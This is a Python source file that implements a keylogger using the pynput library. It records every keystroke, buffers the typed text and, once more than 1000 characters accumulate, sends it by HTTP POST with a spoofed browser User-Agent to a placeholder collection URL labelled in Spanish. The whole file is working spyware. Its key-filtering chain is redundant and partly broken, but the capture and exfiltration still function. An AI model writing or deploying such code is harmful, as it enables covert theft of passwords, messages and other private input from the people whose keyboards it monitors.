from pynput.keyboard import Key, Controller, Listener
import time
import requests


keyboard = Controller()


keys = []


def on_press(key):
    global keys
    # keys.append(str(key).replace("'",""))
    string = str(key).replace("'", "")
    if string == "Key.space":
        string = " "
    if string == "Key.enter":
        string = "\n"
    if string == "Key.backspace":
        string = "Backspace"
    if string == "Key.tab":
        string = ""
    if string == "Key.caps_lock":
        string = ""
    if string == "Key.shift":
        string = ""
    if string == "Key.ctrl":
        string = ""
    if string == "Key.alt":
        string = ""
    if string == "Key.cmd":
        string = ""
    if string == "Key.delete":
        string = ""
    if string == "Key.insert":
        string = ""
    if string == "Key.home":
        string = ""
    if string == "Key.end":
        string = ""
    if string == "Key.page_up":
        string = ""
    if string == "Key.page_down":
        string = ""
    if string == "Key.tab":
        string = ""
    if string == "Backspace":
        string = ""
    if string == "Key.shift_r":
        string = ""
    if string == "Key.shift_l":
        string = ""
    if string == "Key.ctrl_r":
        string = ""
    if string == "Key.ctrl_l":
        string = ""
    if string == "Key.alt_r":
        string = ""
    if string == "Key.alt_l":
        string = ""
    if string == "Key.cmd_r":
        string = ""
    if string == "Key.cmd_l":
        string = ""
    if string == "Key.f1":
        string = ""
    if string == "Key.f2":
        string = ""
    if string == "Key.f3":
        string = ""
    if string == "Key.f4":
        string = ""
    if string == "Key.f5":
        string = ""
    if string == "Key.f6":
        string = ""
    if string == "Key.f7":
        string = ""
    if string == "Key.f8":
        string = ""
    if string == "Key.f9":
        string = ""
    if string == "Key.f10":
        string = ""
    if string == "Key.f11":
        string = ""
    if string == "Key.f12":
        string = ""
    if string == "Key.num_lock":
        string = ""
    if string == "Key.scroll_lock":
        string = ""
    if string == "Key.pause":
        string = ""
    if string == "Key.print_screen":
        string = ""
    if string == "Key.menu":
        string = ""
    if string == "Key.backspace":
        string = ""
    if string == "Key.enter":
        string = ""
    if string == "Key.tab":
        string = ""
    if string == "Key.space":
        string = ""
    if string == "Key.escape":
        string = ""
    if string == "Key.delete":
        string = ""
    if string == "Key.end":
        string = ""
    if string == "Key.home":
        string = ""
    if string == "Key.left":
        string = ""
    if string == "Key.up":
        string = ""
    if string == "Key.right":
        string = ""
    if string == "Key.down":
        string = ""
    if string == "Key.select":
        string = ""
    if string == "Key.print":
        string = ""
    if string == "Key.execute":
        string = ""
    if string == "Key.snapshot":
        string = ""
    if string == "Key.insert":
        string = ""
    if string == "Key.help":
        string = ""
    if string == "Key.undo":
        string = ""
    if string == "Key.redo":
        string = ""
    if string == "Key.back":
        string = ""
    if string == "Key.forward":
        string = ""
    if string == "Key.stop":
        string = ""
    if string == "Key.refresh":
        string = ""
    if string == "Key.volume_mute":
        string = ""
    if string == "Key.volume_down":
        string = ""
    if string == "Key.volume_up":
        string = ""
    if string == "Key.power":
        string = ""
    if string == "Key.sleep":
        string = ""
    if string == "Key.wake":
        string = ""
    if string == "Key.web_search":
        string = ""
    if string == "Key.web_home":
        string = ""
    if string == "Key.web_back":
        string = ""
    if string == "Key.web_forward":
        string = ""
    if string == "Key.web_stop":
        string = ""
    if string == "Key.web_refresh":
        string = ""
    if string == "Key.web_favorites":
        string = ""
    if string == "Key.web_search": 
        string = ""
    if string == "Key.web_home":
        string = ""
    if string == "Key.web_forward":
        string = ""
    else:
        keys.append(string)
        main_string = "".join(keys)
        print(main_string)
        if len(main_string) > 1000:
            nav = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
            url = "su url que reciba los datos"
            send = requests.post(url, data={"key": main_string}, headers=nav)
            print(send.text)
            keys = []

def on_release(key):
    if key == Key.esc:
        return False
    

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

